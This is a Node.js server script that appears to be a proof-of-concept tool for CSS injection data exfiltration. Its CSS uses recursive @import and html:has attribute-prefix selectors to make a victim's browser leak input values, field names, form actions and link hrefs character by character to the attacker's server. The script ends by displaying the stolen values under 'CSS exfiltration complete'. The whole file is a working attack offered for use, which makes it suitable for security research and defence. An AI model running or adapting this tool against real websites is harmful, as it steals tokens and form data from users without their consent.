const connect = require('connect');
const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
const ELEMENTS = ["input","textarea","form","a"];
const ATTRIBUTES = {__proto__:null,"input":["value","name"],"textarea":["name"],"form":["action"],"a":["href"]};
const MAX_ELEMENTS = 20;
const MAX_VALUE = 50;
const WAIT_TIME_MS = 500;

const HEX = "abcdef0123456789";
const LOWER_LETTERS = "abcdefghijklmnopqrstuvwxyz";
const UPPER_LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const NUMBERS = "0123456789";
const SPACE = ' ';
const SYMBOLS = "!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~";
const CHARS = (LOWER_LETTERS + NUMBERS + UPPER_LETTERS + SPACE + SYMBOLS).split('');

var stop = false, n = 0, prefixes = {__proto__:null};
var tokens = [], foundToken = false, currentElementPos = 0;

const app = connect();
const compression = require('compression');
app.use(compression());

app.use('/start', function(request, response){
    n = 0;
    tokens = [];
    prefixes = {__proto__:null};
    stop = false;                    
    foundToken = false;
    currentElementPos = 0;
    genResponse(response, 0);
});

app.use('/l', function(request, response){
    let req = url.parse(request.url, url);
    response.end();
    for(let element of ELEMENTS) {
        for(let attribute of ATTRIBUTES[element]) {                 
            let elementNumber = +req.query.e;
            if(n === +req.query.n && currentElementPos === elementNumber) {
                if(typeof req.query['p_'+element[0]+attribute[0]+elementNumber] !== 'undefined') {
                    if(typeof prefixes['p_'+element[0]+attribute[0]+elementNumber] === 'undefined') {
                        prefixes['p_'+element[0]+attribute[0]+elementNumber] = '';
                    } 
                    if(req.query['p_'+element[0]+attribute[0]+elementNumber].length > prefixes['p_'+element[0]+attribute[0]+elementNumber].length) {
                        prefixes['p_'+element[0]+attribute[0]+elementNumber] = req.query['p_'+element[0]+attribute[0]+elementNumber];                            
                        foundToken = true;
                    }
                }
            }                
        }
    }         
});

app.use('/next', function(request, response){
    setTimeout(x=>{            
        if(!foundToken) {
            checkCompleted(response);
        } else {
            foundToken =false;                  
            n++;
            genResponse(response, currentElementPos);                
        }
    }, WAIT_TIME_MS);
});

app.use('/c', function(request, response){
    let req = url.parse(request.url, url);
    response.end();
    let attribute = req.query.a;
    let tag = req.query.t;
    let value = req.query.v;
    if(!hasToken({tag, attribute, value})) {
        tokens.push({tag, attribute, value});
        foundToken = true;
    }         
});

const genResponse = (response, elementNumber) => {
    let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
    let properties = [];
    for(let element of ELEMENTS) {
        for(let attribute of ATTRIBUTES[element]) { 
            const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+elementNumber+'-'+n;  
            if(typeof prefixes['p_'+element[0]+attribute[0]+elementNumber] === 'undefined') {
                prefixes['p_'+element[0]+attribute[0]+elementNumber] = '';
            }
            const prefix = prefixes['p_'+element[0]+attribute[0]+elementNumber];
            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]'+generateNotSelectors(element,attribute)+')'+'{'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
        }
    }
    if(n === 0 && elementNumber === 0) {  
        for(let element of ELEMENTS) {
            for(let attribute of ATTRIBUTES[element]) {         
                for(let i=0;i<MAX_ELEMENTS;i++) { 
                    for(let j=0;j<MAX_VALUE;j++) {         
                        const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+i+'-'+j;  
                        properties.push('var('+variablePrefix+'s,none)');              
                        properties.push('var('+variablePrefix+'full,none)');                    
                    }
                }
            }
        }
        css += `html{background:${properties.join(',')};}`;
    }
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
};

const server = http.createServer(app).listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
});

function escapeCSS(str) {
    return str.replace(/(["\\])/,'\\$1');
}

function hasToken(newToken) {
    if(!tokens.length) {
        return false;
    }
    let{tag, attribute, value} = newToken;
    return tokens.find(tokenObject => tag === tokenObject.tag && attribute === tokenObject.attribute && value === tokenObject.value);
}

function checkCompleted(response) {
    if(++currentElementPos < MAX_ELEMENTS) {
        prefixes = {__proto__:null};
        stop = false;
        n = 0;
        genResponse(response, ++currentElementPos);
    } else {
        stop = true;            
        completed(response);
    }
}

function completed(response) {
    console.log("Completed.", tokens);
    let extractedValues = '';
    for(let tokenObject of tokens) {
        let{tag, attribute, value} = tokenObject;
        extractedValues += `\\0aTag:\\09\\09\\09\\09 ${tag}\\0a Attribute\\09\\09\\09 ${attribute}\\0a Value\\09\\09\\09 ${value}\\0a`;
    }
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(`
        html:before {
            position:fixed;
            color: #155724;
            background-color: #d4edda;
            border-bottom: 5px solid #c3e6cb;
            padding: 0.75rem 1.25rem;
            font-size: 50px;
            padding: 5px;
            height:calc(100% - 70px);
            width:100%;
            content: "CSS exfiltration complete";
            font-family:Arial;
            box-sizing: border-box
        }
        html:after{
        color: #155724;
            background-color: #d4edda;
            border-color: #c3e6cb;
            padding: 0.75rem 1.25rem;
            border: 1px solid transparent;
        content: "The content on the webpage has been successfully exfiltrated and sent to a remote server. \\0a This is what has been extracted:\\0a ${extractedValues}";
        position:fixed;
        left:0;
        top:50px;
        padding:5px;
        width: 100%;
        height: calc(100% - 70px);
        white-space: pre;
        font-family:Arial;
        box-sizing: border-box
        }
    `);
    response.end();
}

function generateNotSelectors(elementName, attributeName) {
    let selectors = "";
    if(!tokens.length) {
        return '';
    }
    for(const tokenObject of tokens) {
        if(tokenObject.tag === elementName && tokenObject.attribute === attributeName) {
            selectors += ':not('+elementName+'['+escapeCSS(tokenObject.attribute)+'="'+ escapeCSS(tokenObject.value) + '"])';
        }
    }
    return selectors;
}